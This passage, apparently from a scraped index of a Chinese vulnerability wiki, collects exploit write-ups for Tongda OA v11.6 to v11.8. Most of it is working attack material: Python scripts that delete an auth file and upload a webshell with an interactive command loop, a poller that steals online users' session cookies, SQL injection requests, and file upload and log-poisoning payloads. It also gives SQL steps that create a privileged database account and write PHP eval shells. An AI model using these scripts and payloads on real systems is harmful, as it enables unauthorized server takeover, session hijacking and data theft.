则进入else分支 else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachmen","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA v11.6 任意文件删除\u0026RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除\u0026RCE漏洞\\033[0m\") input(\"\\033[32m[o] 此漏洞会对真实环境造成影响，请在授权的情况下利用此漏洞，按下任意键继续..... \\033[0m\") else: print(\"\\033[31m[x] 不存在 /module/appbuilder/assets/print.php 漏洞利用失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] 成功删除校验文件 auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] 删除校验文件 auth.inc.php 失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (绕过的webshell) \u003c?php $command=$_GET['test']; $wsh = new COM('WScript.shell'); $exec = $wsh-\u003eexec(\"cmd /c \".$command); $stdout = $exec-\u003eStdOut(); $stroutput = $stdout-\u003eReadAll(); echo $stroutput; ?\u003e \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload\u0026filetype=test\u0026repkid=/.\u003c\u003e./.\u003c\u003e./.\u003c\u003e./\" files = {'FILE1': ('test.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] 成功写入webshell文件: _test.php \\033[0m\") print(\"\\033[32m[o] webshell地址为: {}/_test.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 写入webshell文件失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_test.php?test={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] 正在执行命令: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] 响应为: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-print.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4rce/"},{"categories":null,"content":"通达OA v11.6 report_bi.func.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.6 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 发送请求包执行SQL语句 POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 113 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27\u0026action=get_link_info\u0026 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.6-report_bi.func.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.7 auth_mobi.php 在线用户登录漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA \u003c v11.7 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 通达OA v11.7下载链接 下载后按步骤安装即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞有关文件 MYOA\\webroot\\mobile\\auth_mobi.php \u003c?php function relogin() { echo _('RELOGIN'); exit; } ob_start(); include_once 'inc/session.php'; include_once 'inc/conn.php'; include_once 'inc/utility.php'; if ($isAvatar == '1' \u0026\u0026 $uid != '' \u0026\u0026 $P_VER != '') { $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\''; $cursor = exequery(TD::conn(), $sql); if ($row = mysql_fetch_array($cursor)) { $P = $row['SID']; } } if ($P == '') { $P = $_COOKIE['PHPSESSID']; if ($P == '') { relogin(); exit; } } if (preg_match('/[^a-z0-9;]+/i', $P)) { echo _('非法参数'); exit; } if (strpos($P, ';') !== false) { $MY_ARRAY = explode(';', $P); $P = trim($MY_ARRAY[1]); } session_id($P); session_start(); session_write_close(); if ($_SESSION['LOGIN_USER_ID'] == '' || $_SESSION['LOGIN_UID'] == '') { relogin(); } 在执行的 SQL语句中 $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\''; 简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID 将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie 访问目标后台 http://xxx.xxx.xxx.xxx/general/ 当目标离线时则访问漏洞页面则会出现如下图 遍历uid也可以获取其他用户权限，可能权限较低 通过此思路可以持续发包监控此页面来获取在线用户的Cookie ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC 5秒一次测试用户是否在线 import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA 11.7 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1\u0026uid=1\u0026P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] 目标用户为下线状态 --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] 用户上线 PHPSESSION: {} --- {}\\033[0m\".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time())))) else: print(\"\\033[31m[x] 请求失败，目标可能不存在漏洞\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) while True: POC_1(target_url) time.sleep(5) 于 2021-3-11 添加进一步利用POC 配合 \u003c v11.8 的 命令执行 当监控到用户上线控制服务器 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA 11.7 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_0(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1\u0026uid=1\u0026P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] 目标用户为下线状态 --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] 用户上线 PHPSESSION: {} --- {}\\033[0m\".format(Cookie[0] ,time.asctime(time.localtime(time.time())))) Cookie = \"PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin\".format(Cookie[0]) POC_1(target_url, Cookie) else: print(\"\\033[31m[x] 请求失败，目标可能不存在漏洞\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1M","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.7 delete_cascade.php 后台SQL注入 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞描述 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞影响 通达OA v11.7 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"环境搭建 环境地址 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞复现 在 general/hr/manage/query/delete_cascade.php 文件中 首先判断$condition_cascade是否为空，如果不为空，则将其中的\\'替换为'。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用addslashes函数进行保护，如下： inc/common.inc.php 代码 使用盲注对SQL注入进行测试 触发了通达OA的SQL注入拦截 inc/conn.php文件中找到过滤机制如下: 其过滤了一些字符，但是并非无法绕过，盲注的核心是：substr、if等函数，均未被过滤，那么只要构造MySQL报错即可配合if函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现power(9999,99)也可以使数据库报错，所以构造语句： select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错 添加SQL数据库用户 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 访问 **http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql. TO ‘peiqi’@’%’ IDENTIFIED BY ‘peiqiABC@123’ WITH GRANT OPTION 进入 Myoa/mysql5/bin 目录 执行 mysql -upeiqi -p 输入密码查询所有用户 发现成功执行添加一个账户 然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限： UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); 然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;这样就拥有了所有权限 登录如果失败，执行 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 利用漏洞写shell # 查路径： select @@basedir; # F:\\OA\\mysql5\\，那么web目录就是 F:/OA/webroot/ # 方法1： set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '\u003c?php eval($_POST[x]);?\u003e' or sleep(11); # 方法2： set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select '\u003c?php eval($_POST[x]);?\u003e'; show variables like '%general%'; 上传大马 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"参考文章 [通达OA v11.7后台SQL注入到RCE0day] ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.7-delete_cascade.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"通达OA v11.8 api.ali.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.8 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 向 api.ali.php 发送请求包 POST /mobile/api/api.ali.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 422 Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae Accept-Encoding: gzip --502f67681799b07e4de6b503655f5cae Content-Disposition: form-data; name=\"file\"; filename=\"fb6790f4.json\" Content-Type: application/octet-stream {\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] =\u003e eval(base64_decode($BackData[a])));/*\\\"}\"} --502f67681799b07e4de6b503655f5cae-- 参数a base解码 ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw== file_put_contents('../../fb6790f4.php',''); 再发送GET请求写入文件，页面返回+OK /inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4 其中请求中对 2109 为 年月,路径为 /fb6790f4.php, ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-api.ali.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.8 getway.php 远程文件包含漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.8 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 发送恶意请求让日志被记录 GET /d1a4278d?json={}\u0026aa=\u003c?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?\u003e HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 在通过漏洞包含日志文件 POST /ispirit/interface/gateway.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 54 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip json={\"url\":\"/general/../../nginx/logs/oa.access.log\"} 再次发送恶意请求写入文件 POST /mac/gateway.php HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 54 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip json={\"url\":\"/general/../../nginx/logs/oa.access.log\"} 访问写入的文件 /mac/cmdshell.php 